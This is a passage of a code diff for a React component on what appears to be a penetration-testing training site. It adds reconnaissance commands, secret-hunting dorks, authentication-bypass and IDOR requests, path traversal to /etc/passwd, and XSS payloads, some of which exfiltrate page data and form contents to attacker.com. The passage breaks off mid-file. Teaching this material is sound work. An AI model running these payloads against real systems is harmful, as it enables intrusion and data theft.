@@ -1,2881 +1,2691 @@
 
 import React, { useState } from 'react';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
-import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
+import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import { Badge } from '@/components/ui/badge';
 import { Separator } from '@/components/ui/separator';
-import { ScrollArea } from '@/components/ui/scroll-area';
-import { Collapsible, CollapsibleContent, CollapsibleTrigger } from '@/components/ui/collapsible';
 import { 
   Shield, 
-  Search, 
+  Code, 
+  Database, 
+  Lock, 
   Bug, 
   Zap, 
-  Database, 
-  Cloud, 
-  Smartphone, 
-  Brain,
-  ChevronDown,
-  ChevronRight,
-  AlertTriangle,
-  Lock,
-  Code,
-  FileText,
-  Target,
-  Settings,
+  FileSearch, 
+  Terminal,
   Globe,
   Server,
-  Key,
-  Eye,
-  Cpu,
-  Network,
-  Layers,
-  BookOpen,
-  Terminal,
-  Activity,
-  Users,
-  TrendingUp,
-  GitBranch,
-  Workflow,
-  Binary,
-  Microscope,
-  Radar,
-  Scale,
-  Flag,
-  Crosshair,
-  Map,
-  Compass,
-  Route
+  Cloud,
+  Smartphone,
+  Brain,
+  Target,
+  AlertTriangle,
+  CheckCircle,
+  XCircle,
+  Info
 } from 'lucide-react';
+import CodeExample from '@/components/CodeExample';
 
 const AdvancedContentSection: React.FC = () => {
-  const [openSections, setOpenSections] = useState<string[]>(['reconnaissance']);
+  const [activeTab, setActiveTab] = useState('reconnaissance');
 
-  const toggleSection = (sectionId: string) => {
-    setOpenSections(prev => 
-      prev.includes(sectionId) 
-        ? prev.filter(id => id !== sectionId)
-        : [...prev, sectionId]
-    );
-  };
-
-  const advancedSections = [
-    {
-      id: 'reconnaissance',
-      title: 'Advanced Reconnaissance Techniques',
-      icon: <Search className="h-5 w-5" />,
-      description: 'Master-level OSINT and information gathering methodologies'
-    },
-    {
-      id: 'vulnerability-assessment',
-      title: 'Comprehensive Vulnerability Assessment',
-      icon: <Bug className="h-5 w-5" />,
-      description: 'Advanced scanning and vulnerability identification techniques'
-    },
-    {
-      id: 'manual-testing',
-      title: 'Manual Testing Methodologies',
-      icon: <Target className="h-5 w-5" />,
-      description: 'Expert-level manual testing approaches and techniques'
-    },
-    {
-      id: 'exploitation',
-      title: 'Advanced Exploitation Techniques',
-      icon: <Zap className="h-5 w-5" />,
-      description: 'Payload crafting and exploitation mastery'
-    },
-    {
-      id: 'professional-testing',
-      title: 'Professional Testing Methodologies',
-      icon: <Scale className="h-5 w-5" />,
-      description: 'Industry-standard frameworks and compliance testing'
-    },
-    {
-      id: 'cloud-security',
-      title: 'Cloud Security Testing',
-      icon: <Cloud className="h-5 w-5" />,
-      description: 'AWS, Azure, GCP security assessment techniques'
-    },
-    {
-      id: 'mobile-iot',
-      title: 'Mobile & IoT Security Testing',
-      icon: <Smartphone className="h-5 w-5" />,
-      description: 'Mobile web and IoT device security assessment'
-    },
-    {
-      id: 'devsecops',
-      title: 'DevSecOps Integration',
-      icon: <GitBranch className="h-5 w-5" />,
-      description: 'CI/CD security testing and automation'
-    },
-    {
-      id: 'api-security',
-      title: 'Advanced API Security',
-      icon: <Network className="h-5 w-5" />,
-      description: 'Comprehensive API testing methodologies'
-    },
-    {
-      id: 'modern-web',
-      title: 'Modern Web App Security',
-      icon: <Globe className="h-5 w-5" />,
-      description: 'SPA, PWA, and modern framework security'
-    },
-    {
-      id: 'ai-ml-security',
-      title: 'AI/ML Security Testing',
-      icon: <Brain className="h-5 w-5" />,
-      description: 'Machine learning and AI application security'
-    },
-    {
-      id: 'blockchain-web3',
-      title: 'Blockchain & Web3 Security',
-      icon: <Binary className="h-5 w-5" />,
-      description: 'Smart contract and DeFi application testing'
-    },
-    {
-      id: 'advanced-research',
-      title: 'Advanced Research Topics',
-      icon: <Microscope className="h-5 w-5" />,
-      description: 'Zero-day research and vulnerability discovery'
-    },
-    {
-      id: 'tools-resources',
-      title: 'Professional Tools & Resources',
-      icon: <Settings className="h-5 w-5" />,
-      description: 'Comprehensive tool arsenal and resources'
-    },
-    {
-      id: 'case-studies',
-      title: 'Real-World Case Studies',
-      icon: <BookOpen className="h-5 w-5" />,
-      description: 'Detailed vulnerability chain analysis'
-    },
-    {
-      id: 'legal-compliance',
-      title: 'Legal & Compliance Framework',
-      icon: <Flag className="h-5 w-5" />,
-      description: 'Legal considerations and compliance testing'
-    },
-    {
-      id: 'enterprise-testing',
-      title: 'Enterprise-Scale Testing',
-      icon: <Users className="h-5 w-5" />,
-      description: 'Large-scale application assessment methodologies'
-    },
-    {
-      id: 'reporting',
-      title: 'Professional Reporting',
-      icon: <FileText className="h-5 w-5" />,
-      description: 'Executive and technical documentation standards'
-    },
-    {
-      id: 'evasion-techniques',
-      title: 'Advanced Evasion Techniques',
-      icon: <Eye className="h-5 w-5" />,
-      description: 'WAF bypass and defense evasion methods'
-    },
-    {
-      id: 'threat-intelligence',
-      title: 'Threat Intelligence Integration',
-      icon: <Radar className="h-5 w-5" />,
-      description: 'Threat hunting and attribution techniques'
-    }
+  const advancedTabs = [
+    { id: 'reconnaissance', title: 'Advanced Reconnaissance', icon: <FileSearch className="h-4 w-4" /> },
+    { id: 'vulnerability-assessment', title: 'Vulnerability Assessment', icon: <Bug className="h-4 w-4" /> },
+    { id: 'manual-testing', title: 'Manual Testing', icon: <Target className="h-4 w-4" /> },
+    { id: 'exploitation', title: 'Exploitation Techniques', icon: <Zap className="h-4 w-4" /> },
+    { id: 'professional-testing', title: 'Professional Testing', icon: <Shield className="h-4 w-4" /> },
+    { id: 'cloud-security', title: 'Cloud Security', icon: <Cloud className="h-4 w-4" /> },
+    { id: 'mobile-iot', title: 'Mobile & IoT', icon: <Smartphone className="h-4 w-4" /> },
+    { id: 'advanced-research', title: 'Advanced Research', icon: <Brain className="h-4 w-4" /> },
+    { id: 'tools-resources', title: 'Tools & Resources', icon: <Terminal className="h-4 w-4" /> },
+    { id: 'case-studies', title: 'Case Studies', icon: <FileSearch className="h-4 w-4" /> },
+    { id: 'legal-compliance', title: 'Legal & Compliance', icon: <Lock className="h-4 w-4" /> },
+    { id: 'devsecops', title: 'DevSecOps Integration', icon: <Code className="h-4 w-4" /> }
   ];
 
   return (
     <div className="space-y-8">
       <div className="text-center mb-8">
-        <h2 className="text-3xl font-bold mb-4 text-cybr-primary">
+        <h2 className="text-3xl font-bold text-cybr-primary mb-4">
           Advanced Web Penetration Testing
         </h2>
-        <p className="text-lg opacity-80 max-w-4xl mx-auto">
-          Master-level web application security testing methodologies, advanced exploitation techniques, 
-          and professional-grade assessment frameworks used by expert penetration testers worldwide.
+        <p className="text-lg text-cybr-muted">
+          Master-level techniques, methodologies, and cutting-edge security research for professional penetration testers
         </p>
       </div>
 
-      <div className="space-y-6">
-        {advancedSections.map((section) => (
-          <Card key={section.id} className="border-cybr-border bg-cybr-muted/50">
-            <Collapsible 
-              open={openSections.includes(section.id)}
-              onOpenChange={() => toggleSection(section.id)}
+      <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
+        <TabsList className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-6 w-full bg-cybr-muted/30 p-1 h-auto">
+          {advancedTabs.map(tab => (
+            <TabsTrigger 
+              key={tab.id}
+              value={tab.id}
+              className="flex items-center gap-2 text-xs py-2 px-3"
             >
-              <CollapsibleTrigger asChild>
-                <CardHeader className="cursor-pointer hover:bg-cybr-muted/30 transition-colors">
-                  <div className="flex items-center justify-between">
-                    <div className="flex items-center gap-3">
-                      <div className="p-2 rounded-lg bg-cybr-primary/20 text-cybr-primary">
-                        {section.icon}
-                      </div>
-                      <div>
-                        <CardTitle className="text-left">{section.title}</CardTitle>
-                        <CardDescription className="text-left">{section.description}</CardDescription>
+              {tab.icon}
+              <span className="hidden sm:inline text-center">{tab.title}</span>
+            </TabsTrigger>
+          ))}
+        </TabsList>
+
+        {/* Advanced Reconnaissance */}
+        <TabsContent value="reconnaissance" className="mt-6 space-y-6">
+          <Card>
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <FileSearch className="h-5 w-5" />
+                OSINT (Open Source Intelligence) Gathering
+              </CardTitle>
+              <CardDescription>
+                Comprehensive passive information gathering techniques for web application assessment
+              </CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-6">
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Google Dorking - Advanced Operators</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <CodeExample
+                    language="bash"
+                    code={`# Administrative Interfaces
+site:example.com inurl:admin
+site:example.com inurl:administrator
+site:example.com inurl:login
+site:example.com inurl:wp-admin
+site:example.com inurl:phpmyadmin
+site:example.com inurl:cpanel
+
+# Configuration Files
+site:example.com filetype:xml | filetype:conf
+site:example.com ext:cfg | ext:env | ext:ini
+site:example.com inurl:web.config
+site:example.com inurl:.htaccess
+
+# Database Files
+site:example.com filetype:sql | filetype:dbf
+site:example.com ext:db | ext:sqlite
+site:example.com inurl:backup
+site:example.com inurl:dump
+
+# Sensitive Information
+site:example.com "password" | "passwd"
+site:example.com "api_key" | "apikey"
+site:example.com "secret_key"
+site:example.com "private_key"`}
+                    title="Google Dorking Examples"
+                  />
+                  <CodeExample
+                    language="bash"
+                    code={`# Error Messages
+site:example.com "error" | "exception"
+site:example.com "stack trace" | "debug"
+site:example.com "database error"
+site:example.com "php error" | "asp error"
+
+# Version Information
+site:example.com "powered by" | "built with"
+site:example.com inurl:readme
+site:example.com filetype:txt "version"
+
+# Directory Listings
+site:example.com intitle:"index of"
+site:example.com intitle:"directory listing"
+site:example.com "parent directory"
+
+# Development Files
+site:example.com inurl:dev | inurl:development
+site:example.com inurl:test | inurl:testing
+site:example.com inurl:stage | inurl:staging
+site:example.com inurl:beta`}
+                    title="Advanced Dork Queries"
+                  />
+                </div>
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Subdomain Enumeration Tools</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <CodeExample
+                    language="bash"
+                    code={`# Amass - Advanced DNS Enumeration
+amass enum -d example.com
+amass enum -brute -d example.com
+amass enum -active -d example.com -p 80,443,8080
+
+# Subfinder - High-speed Discovery
+subfinder -d example.com
+subfinder -d example.com -all
+subfinder -d example.com -o subdomains.txt
+
+# Assetfinder - Rapid Discovery
+assetfinder example.com
+assetfinder --subs-only example.com
+
+# DNSRecon - Comprehensive DNS
+dnsrecon -d example.com -t std
+dnsrecon -d example.com -t brt -D /usr/share/wordlists/dnsmap.txt`}
+                    title="Active Enumeration"
+                  />
+                  <CodeExample
+                    language="bash"
+                    code={`# Certificate Transparency Logs
+curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value'
+
+# Passive DNS with SecurityTrails
+curl -s "https://api.securitytrails.com/v1/domain/example.com/subdomains" \\
+  -H "APIKEY: YOUR_API_KEY" | jq -r '.subdomains[]'
+
+# Wayback Machine URLs
+curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=text&fl=original&collapse=urlkey"
+
+# GitHub Code Search
+curl -s "https://api.github.com/search/code?q=example.com" | jq -r '.items[].html_url'`}
+                    title="Passive Enumeration"
+                  />
+                </div>
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Technology Stack Detection</h4>
+                <CodeExample
+                  language="bash"
+                  code={`# Wappalyzer CLI
+wappalyzer https://example.com
+
+# WhatWeb - Comprehensive Detection
+whatweb https://example.com
+whatweb -v https://example.com
+whatweb --aggression=3 https://example.com
+
+# BuiltWith API
+curl "https://api.builtwith.com/v12/api.json?KEY=YOUR_KEY&LOOKUP=example.com"
+
+# Retire.js - JavaScript Library Scanner
+retire --js --outputformat json --outputpath results.json https://example.com
+
+# Nuclei - Template-based Scanning
+nuclei -u https://example.com -t technologies/
+nuclei -u https://example.com -t exposures/`}
+                  title="Technology Fingerprinting"
+                />
+              </div>
+            </CardContent>
+          </Card>
+
+          <Card>
+            <CardHeader>
+              <CardTitle>Content Discovery Techniques</CardTitle>
+              <CardDescription>Advanced directory and file enumeration methods</CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <CodeExample
+                  language="bash"
+                  code={`# Gobuster - High Performance
+gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt
+gobuster vhost -u https://example.com -w /usr/share/wordlists/subdomains-top1million-5000.txt
+
+# FFuF - Fast Web Fuzzer
+ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/FUZZ
+ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/FUZZ -fc 404
+ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/FUZZ -mc 200,301,302`}
+                  title="Directory Enumeration"
+                />
+                <CodeExample
+                  language="bash"
+                  code={`# Parameter Discovery
+ffuf -w /usr/share/wordlists/parameters.txt -u https://example.com/index.php?FUZZ=test -fc 404
+
+# Backup File Discovery
+gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -x bak,old,orig,backup,~
+
+# API Endpoint Discovery
+gobuster dir -u https://example.com -w /usr/share/wordlists/api-endpoints.txt -x json
+
+# Git Repository Scanner
+python3 gitdorker.py -tf tokens.txt -q example.com -d dorks/`}
+                  title="Specialized Discovery"
+                />
+              </div>
+            </CardContent>
+          </Card>
+        </TabsContent>
+
+        {/* Vulnerability Assessment */}
+        <TabsContent value="vulnerability-assessment" className="mt-6 space-y-6">
+          <Card>
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <Bug className="h-5 w-5" />
+                Advanced Vulnerability Scanning
+              </CardTitle>
+              <CardDescription>
+                Professional-grade vulnerability assessment methodologies and tools
+              </CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-6">
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Burp Suite Professional - Complete Configuration</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">Scanner Configuration</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Passive scanning: Always enabled for background analysis</li>
+                        <li>• Active scanning: Configure insertion points and attack types</li>
+                        <li>• Scanner issues: Customize severity levels and false positive handling</li>
+                        <li>• Live scanning: Real-time vulnerability detection during browsing</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h5 className="font-medium mb-2">Intruder Attack Types</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• <strong>Sniper:</strong> Single payload set, one position at a time</li>
+                        <li>• <strong>Battering Ram:</strong> Single payload set, all positions simultaneously</li>
+                        <li>• <strong>Pitchfork:</strong> Multiple payload sets, parallel iteration</li>
+                        <li>• <strong>Cluster Bomb:</strong> Multiple payload sets, all combinations</li>
+                      </ul>
+                    </div>
+                  </div>
+                  <CodeExample
+                    language="bash"
+                    code={`# Burp Suite Command Line
+java -jar -Xmx4g burpsuite_pro.jar
+
+# Headless Scanning
+java -jar -Djava.awt.headless=true burpsuite_pro.jar \\
+  --project-file=project.burp \\
+  --config-file=config.json
+
+# API Integration
+curl -X POST http://localhost:1337/v0.1/scan \\
+  -H "Content-Type: application/json" \\
+  -d '{"urls":["https://example.com"]}'`}
+                    title="Burp Suite Automation"
+                  />
+                </div>
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">OWASP ZAP Advanced Usage</h4>
+                <CodeExample
+                  language="bash"
+                  code={`# ZAP Baseline Scan
+docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-baseline.py \\
+  -t https://example.com -g gen.conf -r testreport.html
+
+# ZAP Full Scan
+docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-full-scan.py \\
+  -t https://example.com -g gen.conf -r testreport.html
+
+# ZAP API Scan
+docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-api-scan.py \\
+  -t https://example.com/api/swagger.json -f openapi -g gen.conf -r testreport.html
+
+# ZAP with Authentication
+zap.sh -daemon -config api.key=your-api-key
+curl "http://localhost:8080/JSON/authentication/action/setAuthenticationMethod/?contextId=0&authMethodName=formBasedAuthentication&authMethodConfigParams=loginUrl%3Dhttps%3A//example.com/login%26loginRequestData%3Dusername%3D%7B%25username%25%7D%26password%3D%7B%25password%25%7D"
+
+# ZAP Scripting
+curl "http://localhost:8080/JSON/script/action/load/?scriptName=MyScript&scriptType=standalone&scriptEngine=ECMAScript&fileName=/path/to/script.js"`}
+                  title="ZAP Automation & API"
+                />
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Nuclei - Template-based Scanning</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <CodeExample
+                    language="bash"
+                    code={`# Basic Nuclei Scans
+nuclei -u https://example.com
+nuclei -l urls.txt
+nuclei -u https://example.com -t cves/
+nuclei -u https://example.com -t exposures/
+nuclei -u https://example.com -t vulnerabilities/
+
+# Advanced Filtering
+nuclei -u https://example.com -s critical,high
+nuclei -u https://example.com -tags sqli,xss
+nuclei -u https://example.com -author geeknik
+nuclei -u https://example.com -severity critical
+
+# Custom Templates
+nuclei -u https://example.com -t custom-templates/
+nuclei -u https://example.com -t ~/nuclei-templates/custom/`}
+                    title="Nuclei Scanning"
+                  />
+                  <CodeExample
+                    language="yaml"
+                    code={`id: custom-api-key-exposure
+
+info:
+  name: API Key Exposure Detection
+  author: security-team
+  severity: high
+  description: Detects exposed API keys in responses
+  tags: exposure,api,keys
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/config.json"
+      - "{{BaseURL}}/.env"
+      - "{{BaseURL}}/app.config"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "api[_-]?key['\"]?\\s*[:=]\\s*['\"]?[a-zA-Z0-9]{20,}"
+          - "secret[_-]?key['\"]?\\s*[:=]\\s*['\"]?[a-zA-Z0-9]{20,}"
+        condition: or
+
+      - type: status
+        status:
+          - 200`}
+                    title="Custom Template Example"
+                  />
+                </div>
+              </div>
+            </CardContent>
+          </Card>
+
+          <Card>
+            <CardHeader>
+              <CardTitle>Advanced Fuzzing Techniques</CardTitle>
+              <CardDescription>Parameter discovery and injection testing methodologies</CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <CodeExample
+                  language="bash"
+                  code={`# Parameter Discovery with Arjun
+python3 arjun.py -u https://example.com/api/endpoint
+python3 arjun.py -u https://example.com/search --get
+python3 arjun.py -u https://example.com/login --post
+
+# ParamMiner (Burp Extension)
+# Discovers hidden parameters through:
+# - Cache poisoning techniques
+# - Response analysis
+# - Header injection
+# - Cookie manipulation
+
+# Parameter Pollution Testing
+ffuf -w parameters.txt -u "https://example.com/search?query=test&FUZZ=value"
+ffuf -w parameters.txt -u "https://example.com/api?param1=value1&FUZZ=value2"`}
+                  title="Parameter Discovery"
+                />
+                <CodeExample
+                  language="bash"
+                  code={`# Advanced Payload Testing
+wfuzz -c -z file,payloads/xss.txt -u "https://example.com/search?q=FUZZ"
+wfuzz -c -z file,payloads/sqli.txt -u "https://example.com/login" -d "username=admin&password=FUZZ"
+
+# Custom Wordlist Generation
+cewl https://example.com -w custom_wordlist.txt
+cewl https://example.com -d 2 -m 5 -w custom_wordlist.txt
+
+# Mutation-based Fuzzing
+radamsa -o output_%n.txt -n 100 input.txt
+zzuf -s 0:100 -c -C 0 -q < input.txt`}
+                  title="Payload Generation"
+                />
+              </div>
+            </CardContent>
+          </Card>
+        </TabsContent>
+
+        {/* Manual Testing Methodologies */}
+        <TabsContent value="manual-testing" className="mt-6 space-y-6">
+          <Card>
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <Target className="h-5 w-5" />
+                Session Management Testing
+              </CardTitle>
+              <CardDescription>
+                Comprehensive session security assessment techniques
+              </CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-6">
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Session Token Analysis</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">Token Randomness Testing</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Collect 100+ session tokens from the application</li>
+                        <li>• Analyze entropy using statistical tests (Chi-square, Kolmogorov-Smirnov)</li>
+                        <li>• Check for patterns, sequential values, or predictable components</li>
+                        <li>• Use Burp Sequencer for automated analysis</li>
+                        <li>• Calculate bit entropy: H(X) = -Σ P(xi) * log2(P(xi))</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h5 className="font-medium mb-2">Session Lifecycle Testing</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Test session creation: How are tokens generated?</li>
+                        <li>• Session renewal: Do tokens change during the session?</li>
+                        <li>• Session expiration: Are timeouts properly enforced?</li>
+                        <li>• Session termination: Is logout effective across all contexts?</li>
+                        <li>• Concurrent sessions: Are multiple sessions allowed?</li>
+                      </ul>
+                    </div>
+                  </div>
+                  <CodeExample
+                    language="python"
+                    code={`import requests
+import statistics
+import math
+from collections import Counter
+
+def analyze_session_entropy(tokens):
+    """Analyze entropy of session tokens"""
+    all_chars = ''.join(tokens)
+    char_count = Counter(all_chars)
+    total_chars = len(all_chars)
+    
+    # Calculate Shannon entropy
+    entropy = 0
+    for count in char_count.values():
+        probability = count / total_chars
+        entropy -= probability * math.log2(probability)
+    
+    return entropy
+
+def test_session_randomness():
+    """Collect and analyze session tokens"""
+    tokens = []
+    session = requests.Session()
+    
+    for i in range(100):
+        # Login and get session token
+        response = session.post('https://example.com/login', 
+                              data={'username': 'test', 'password': 'test'})
+        
+        # Extract session token
+        token = session.cookies.get('SESSIONID')
+        if token:
+            tokens.append(token)
+        
+        # Logout to get fresh token
+        session.get('https://example.com/logout')
+    
+    # Analyze entropy
+    entropy = analyze_session_entropy(tokens)
+    print(f"Session token entropy: {entropy:.2f} bits")
+    
+    return tokens`}
+                    title="Session Token Analysis Script"
+                  />
+                </div>
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Authentication Bypass Techniques</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <CodeExample
+                    language="http"
+                    code={`# SQL Injection in Authentication
+POST /login HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+
+username=admin'--&password=anything
+
+# NoSQL Injection
+POST /login HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{"username": {"$ne": null}, "password": {"$ne": null}}
+
+# HTTP Parameter Pollution
+POST /login HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&username=guest&password=wrong&password=correct`}
+                    title="Injection-based Bypass"
+                  />
+                  <CodeExample
+                    language="http"
+                    code={`# Race Condition Authentication
+# Rapid parallel requests to exploit timing windows
+POST /login HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=wrong
+
+# Password Reset Token Manipulation
+POST /reset-password HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{"token": "abc123", "new_password": "hacked", "user_id": "1"}
+
+# Multi-Factor Authentication Bypass
+POST /verify-2fa HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{"code": "000000", "backup_code": "reused_code"}`}
+                    title="Logic-based Bypass"
+                  />
+                </div>
+              </div>
+            </CardContent>
+          </Card>
+
+          <Card>
+            <CardHeader>
+              <CardTitle>Authorization Testing Framework</CardTitle>
+              <CardDescription>Systematic approach to access control testing</CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <CodeExample
+                  language="bash"
+                  code={`# Vertical Privilege Escalation Testing
+# Test as low-privilege user
+curl -H "Authorization: Bearer user_token" \\
+  https://example.com/admin/users
+
+# Test direct object access
+curl -H "Authorization: Bearer user_token" \\
+  https://example.com/api/admin/delete-user/123
+
+# Function-level access testing
+curl -H "Authorization: Bearer user_token" \\
+  -X DELETE https://example.com/api/users/456
+
+# Hidden endpoint discovery
+ffuf -w admin-endpoints.txt \\
+  -u https://example.com/FUZZ \\
+  -H "Authorization: Bearer user_token"`}
+                  title="Privilege Escalation Tests"
+                />
+                <CodeExample
+                  language="bash"
+                  code={`# Horizontal Privilege Escalation
+# Access other users' resources
+curl -H "Authorization: Bearer userA_token" \\
+  https://example.com/api/users/userB/profile
+
+# IDOR Testing with Parameter Manipulation
+curl -H "Authorization: Bearer user_token" \\
+  "https://example.com/api/documents?user_id=OTHER_USER_ID"
+
+# Path Traversal in Authorization
+curl -H "Authorization: Bearer user_token" \\
+  "https://example.com/api/files/../../../etc/passwd"
+
+# Multi-tenant Boundary Testing
+curl -H "Authorization: Bearer tenant1_token" \\
+  -H "X-Tenant-ID: tenant2" \\
+  https://example.com/api/data`}
+                  title="Horizontal Escalation Tests"
+                />
+              </div>
+            </CardContent>
+          </Card>
+
+          <Card>
+            <CardHeader>
+              <CardTitle>Business Logic Testing</CardTitle>
+              <CardDescription>Workflow manipulation and logic flaw detection</CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div className="space-y-4">
+                  <div>
+                    <h5 className="font-medium mb-2">Workflow Manipulation Techniques</h5>
+                    <ul className="text-sm space-y-1 text-cybr-muted">
+                      <li>• <strong>Step Skipping:</strong> Skip validation or payment steps</li>
+                      <li>• <strong>Process Reversal:</strong> Complete steps in wrong order</li>
+                      <li>• <strong>Parallel Processing:</strong> Execute concurrent workflows</li>
+                      <li>• <strong>State Corruption:</strong> Manipulate application state</li>
+                      <li>• <strong>Time Manipulation:</strong> Exploit timing dependencies</li>
+                    </ul>
+                  </div>
+                  <div>
+                    <h5 className="font-medium mb-2">E-commerce Specific Tests</h5>
+                    <ul className="text-sm space-y-1 text-cybr-muted">
+                      <li>• Price manipulation in shopping cart</li>
+                      <li>• Negative quantity testing</li>
+                      <li>• Discount code stacking and reuse</li>
+                      <li>• Payment process interruption</li>
+                      <li>• Inventory bypass techniques</li>
+                    </ul>
+                  </div>
+                </div>
+                <CodeExample
+                  language="javascript"
+                  code={`// Shopping Cart Manipulation
+// 1. Add item to cart
+fetch('/api/cart/add', {
+  method: 'POST',
+  body: JSON.stringify({
+    product_id: 123,
+    quantity: 1,
+    price: 100.00
+  })
+});
+
+// 2. Manipulate price before checkout
+fetch('/api/cart/update', {
+  method: 'PUT',
+  body: JSON.stringify({
+    item_id: 456,
+    price: 0.01,  // Price manipulation
+    quantity: 1
+  })
+});
+
+// 3. Race condition during payment
+Promise.all([
+  fetch('/api/payment/process', {method: 'POST', body: paymentData}),
+  fetch('/api/cart/clear', {method: 'DELETE'})
+]);
+
+// 4. Negative quantity testing
+fetch('/api/cart/add', {
+  method: 'POST',
+  body: JSON.stringify({
+    product_id: 123,
+    quantity: -1,  // Negative quantity
+    price: 100.00
+  })
+});`}
+                  title="Business Logic Exploit Examples"
+                />
+              </div>
+            </CardContent>
+          </Card>
+        </TabsContent>
+
+        {/* Exploitation Techniques */}
+        <TabsContent value="exploitation" className="mt-6 space-y-6">
+          <Card>
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <Zap className="h-5 w-5" />
+                Advanced Payload Crafting
+              </CardTitle>
+              <CardDescription>
+                Master-level exploitation techniques and payload development
+              </CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-6">
+              <div>
+                <h4 className="text-lg font-semibold mb-3">XSS Payload Engineering</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <CodeExample
+                    language="javascript"
+                    code={`<!-- Basic XSS Payloads -->
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')"></iframe>
+
+<!-- Filter Bypass Techniques -->
+<ScRiPt>alert('XSS')</ScRiPt>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert(/XSS/.source)</script>
+<script>alert\`XSS\`</script>
+<script>alert('XS'+'S')</script>
+
+<!-- Event Handler Exploitation -->
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<video onloadstart=alert('XSS')><source></video>`}
+                    title="XSS Payload Examples"
+                  />
+                  <CodeExample
+                    language="javascript"
+                    code={`<!-- WAF Bypass Techniques -->
+<script>/**/alert('XSS')</script>
+<script>/*!alert('XSS')*/</script>
+<script>alert('XSS')</script>
+<SCRIPT>alert('XSS')</SCRIPT>
+<script>\\u0061lert('XSS')</script>
+
+<!-- CSP Bypass -->
+<script nonce="random123">alert('XSS')</script>
+<script src="data:text/javascript,alert('XSS')"></script>
+<script src="//attacker.com/xss.js"></script>
+
+<!-- Advanced Techniques -->
+<script>
+fetch('/api/sensitive')
+  .then(r=>r.text())
+  .then(d=>location='//attacker.com/?'+btoa(d))
+</script>
+
+<script>
+navigator.sendBeacon('//attacker.com', 
+  new FormData(document.forms[0]))
+</script>`}
+                    title="Advanced XSS Techniques"
+                  />
+                </div>
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">SQL Injection Mastery</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <CodeExample
+                    language="sql"
